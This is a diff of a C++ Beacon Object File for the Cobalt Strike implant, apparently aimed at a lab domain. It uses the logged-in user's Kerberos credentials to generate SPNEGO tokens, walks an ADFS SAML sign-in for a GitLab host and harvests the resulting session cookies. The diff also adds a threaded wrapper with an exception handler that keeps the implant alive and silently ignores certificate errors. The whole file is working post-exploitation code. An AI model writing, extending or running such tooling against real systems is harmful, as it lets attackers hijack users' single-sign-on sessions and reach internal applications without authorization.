@@ -1,12 +1,10 @@
 #include <Windows.h>
 #include "base\helpers.h"
-/**
-* For the debug build we want:
-*   a) Include the mock-up layer
-*   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
-*      is linked against the the debug build.
-*/
+
 #ifdef _DEBUG
+#pragma comment(lib, "Secur32.lib")
+#pragma comment(lib, "Crypt32.lib")
+#pragma comment(lib, "Wininet.lib")
 #undef DECLSPEC_IMPORT
 #define DECLSPEC_IMPORT
 #include "base\mock.h"
@@ -14,6 +12,7 @@
 #ifndef SECURITY_WIN32
 #define SECURITY_WIN32
 #endif
+
 extern "C" {
 #include "beacon.h"
 #include "sleepmask.h"
@@ -22,22 +21,17 @@ extern "C" {
 #include <sspi.h>
 #include "bofdefs.h"
 #include <wininet.h>
-#ifdef _DEBUG
-#pragma comment(lib, "Secur32.lib")
-#pragma comment(lib, "Crypt32.lib")
-#pragma comment(lib, "Wininet.lib")
-#endif
+
  // ==================== CONFIGURATION - MODIFY THESE ====================
  // Domain and network configuration
 #define TARGET_DOMAIN "ludus.nuketown"
 #define GITLAB_HOST "gitlab.ludus.nuketown"
 #define ADFS_HOST "adfs.ludus.nuketown"
-// SPN Configuration - STATIC VALUE
+// SPN Configuration
 #define SPN_VALUE "HTTP/adfs.ludus.nuketown"
 // Proxy Configuration
 #define USE_PROXY FALSE
 #define PROXY_ADDRESS "127.0.0.1:8080"
-#define PROXY_BYPASS "<local>"
 // HTTP Configuration
 #define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0"
 #define MAX_REDIRECTS 10
@@ -51,6 +45,15 @@ extern "C" {
 #define PATH_BUFFER_SIZE 1024
 #define HEADER_BUFFER_SIZE 4096
 #define REFERER_BUFFER_SIZE 1024
+
+
+// ==================== SAML Flow Here ====================
+// 1. First request will hit the Application Sign-In URL (This is because we will be using the applicatition to generate the SAML request, otherwise 
+// we would need to guess the claims within the SAML Request. This will generate an authenticity token that can be used to request a SAMLrequest token.
+// 2. Make a request for a SAMLrequest token. The application will return a redirect URL with the SAML request
+// 3. Provide SAML request to ADFS server
+// 4. Provide SAML assertion back to application for session cookies
+
 
 // ==================== FUNCTION DECLARATIONS ====================
     static void print_last_error(const char* msg);
@@ -69,12 +72,31 @@ extern "C" {
     BOOL send_http_request(HINTERNET hRequest, const char* headers, const char* postData, DWORD postDataLen);
     char* read_http_response(HINTERNET hRequest, size_t* resp_len);
     char* perform_request_1_get_signin_page(HINTERNET hSession, HINTERNET hConnect);
-    char* perform_request_2_post_saml_auth(HINTERNET hSession, HINTERNET hConnect, const char* token, char** redirect_location);
+    char* perform_request_2_post_saml_auth(HINTERNET hSession, HINTERNET hConnect, const char* token);
     char* perform_request_3_follow_redirects(HINTERNET hSession, HINTERNET hConnect, const char* initialLocation, const char* base64Token, char** last_referer);
     void perform_request_4_post_saml_callback(HINTERNET hSession, HINTERNET hConnect, const char* samlResponse, const char* referer);
     void clear_all_cookies();
-    // ==================== MAIN ENTRY POINT ====================
+    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
+    unsigned __stdcall performSAML(void* p);
+
+
     void go(PCHAR args, int len) {
+        DWORD exitcode = 0;
+        HANDLE thread = NULL;
+        PVOID eHandler = NULL;
+        eHandler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
+        thread = (HANDLE)_beginthreadex(NULL, 0, performSAML, NULL, 0, NULL);
+        WaitForSingleObject(thread, INFINITE);
+        GetExitCodeThread(thread, &exitcode);
+        if (exitcode != 0)
+        {
+            BeaconPrintf(CALLBACK_ERROR, "An exception occured while running: 0x%x\n", exitcode);
+        }
+        if (thread) { CloseHandle(thread); }
+        //if (eHandler) { RemoveVectoredExceptionHandler(eHandler); }
+    }
+    // ==================== MAIN ENTRY POINT ====================
+    unsigned __stdcall performSAML(void* p) {
         // Initialize all variables at the top to avoid goto issues
         char* base64TokenForAdfs = NULL;
         CredHandle hCredForAdfs = { 0 };
@@ -82,11 +104,13 @@ extern "C" {
         HINTERNET hSession = NULL;
         HINTERNET hConnect = NULL;
         char* authenticityToken = NULL;
-        char* redirectLocation = NULL;
         char* samlResponse = NULL;
+        char* samlRequest = NULL;
         char* lastReferer = NULL;
         BOOL credHandleForAdfsAcquired = FALSE;
         BOOL ctxForAdfsInitialized = FALSE;
+
+        // If cookies arent cleared, reruns of this BOF wont work
         clear_all_cookies();
         // Setup HTTP session
         hSession = setup_http_session();
@@ -116,20 +140,19 @@ extern "C" {
             BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 1 FAILED: Could not extract authenticity_token");
             goto cleanup;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 1 SUCCESS: Extracted authenticity_token");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 1 SUCCESS: Extracted authenticity_token TESTING");
 
         // ==================== REQUEST 2: POST SAML Authentication ====================
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 2: POST SAML Authentication");
-        redirectLocation = NULL;
-        samlResponse = perform_request_2_post_saml_auth(hSession, hConnect, authenticityToken, &redirectLocation);
-        if (!redirectLocation) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 2: POST Request for SAMLRequest token");
+        samlRequest = perform_request_2_post_saml_auth(hSession, hConnect, authenticityToken);
+        if (!samlRequest) {
             BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 2 FAILED: No redirect location received");
             goto cleanup;
         }
         BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 2 SUCCESS: Received redirect to ADFS");
 
         // ==================== REQUEST 3: Follow Redirect Chain to ADFS ====================
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 3: Follow Redirect Chain");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 3: ADFS SAML Assertion Request");
 
         // Generate SPNEGO token for ADFS right before use
         base64TokenForAdfs = generate_spnego_token(&hCredForAdfs, &hCtxForAdfs);
@@ -141,7 +164,7 @@ extern "C" {
         ctxForAdfsInitialized = TRUE;
 
         lastReferer = NULL;
-        samlResponse = perform_request_3_follow_redirects(hSession, hConnect, redirectLocation, base64TokenForAdfs, &lastReferer);
+        samlResponse = perform_request_3_follow_redirects(hSession, hConnect, samlRequest, base64TokenForAdfs, &lastReferer);
         if (!samlResponse) {
             BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 3 FAILED: No SAMLResponse found in redirect chain");
             goto cleanup;
@@ -149,14 +172,14 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 3 SUCCESS: Retrieved SAMLResponse from ADFS");
 
         // ==================== REQUEST 4: POST SAMLResponse to Callback ====================
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 4: POST SAMLResponse Callback");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 4: Provide SAML Response back to Application for Session Cookies");
         perform_request_4_post_saml_callback(hSession, hConnect, samlResponse, lastReferer);
 
     cleanup:
         // Cleanup in reverse order of allocation
         if (lastReferer) intFree(lastReferer);
         if (samlResponse) intFree(samlResponse);
-        if (redirectLocation) intFree(redirectLocation);
+        if (samlRequest) intFree(samlRequest);
         if (authenticityToken) intFree(authenticityToken);
         if (hConnect) InternetCloseHandle(hConnect);
         if (hSession) InternetCloseHandle(hSession);
@@ -164,7 +187,7 @@ extern "C" {
         if (ctxForAdfsInitialized) DeleteSecurityContext(&hCtxForAdfs);
         if (credHandleForAdfsAcquired) FreeCredentialsHandle(&hCredForAdfs);
         clear_all_cookies();
-
+        return 0;
     }
     // ==================== SPNEGO TOKEN GENERATION ====================
     char* generate_spnego_token(CredHandle* hCredHandle, CtxtHandle* hNewCtx) {
@@ -237,6 +260,7 @@ extern "C" {
 
         return base64Token;
     }
+
     // ==================== HTTP SESSION SETUP ====================
     HINTERNET setup_http_session() {
         HINTERNET hSession = InternetOpenA(
@@ -251,6 +275,7 @@ extern "C" {
         }
         return hSession;
     }
+
     // ==================== HTTP REQUEST HELPERS ====================
     HINTERNET create_http_request(HINTERNET hConnect, const char* method, const char* path, const char* referer, DWORD flags) {
         const char* acceptTypes[] = { "*/*", NULL };
@@ -269,7 +294,7 @@ extern "C" {
             return NULL;
         }
 
-        // Ignore cert errors (remove in production!)
+        // Ignore cert errors
         DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
             SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
@@ -291,6 +316,7 @@ extern "C" {
         }
         return TRUE;
     }
+
     char* read_http_response(HINTERNET hRequest, size_t* resp_len) {
         char* chunk = (char*)intAlloc(CHUNK_SIZE);
         if (!chunk) {
@@ -358,7 +384,7 @@ extern "C" {
         return token;
     }
     // ==================== REQUEST 2: POST SAML AUTH ====================
-    char* perform_request_2_post_saml_auth(HINTERNET hSession, HINTERNET hConnect, const char* token, char** redirect_location) {
+    char* perform_request_2_post_saml_auth(HINTERNET hSession, HINTERNET hConnect, const char* token) {
         char* resp = NULL;
         size_t resp_len = 0;
         char* location = NULL;
@@ -412,7 +438,7 @@ extern "C" {
         if (statusCode >= 300 && statusCode < 400) {
             location = get_location_header(hRequest);
             if (location) {
-                *redirect_location = location;
+                return location;
             }
             else {
                 BeaconPrintf(CALLBACK_ERROR, "[!] Expected redirect but no Location header found");
@@ -425,6 +451,7 @@ extern "C" {
         if (hRequest) InternetCloseHandle(hRequest);
         return NULL; // This request doesn't return data, only redirect location
     }
+
     // ==================== REQUEST 3: FOLLOW REDIRECT CHAIN ====================
     char* perform_request_3_follow_redirects(HINTERNET hSession, HINTERNET hConnect, const char* initialLocation, const char* base64Token, char** last_referer) {
         char* samlResponse = NULL;
@@ -1010,6 +1037,14 @@ extern "C" {
             BeaconPrintf(CALLBACK_OUTPUT, "[*] All cookies and session data cleared");
         }
     }
+
+
+    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
+    {
+        _endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
 
     // ==================== CLEANUP ====================
     void bofstop() {
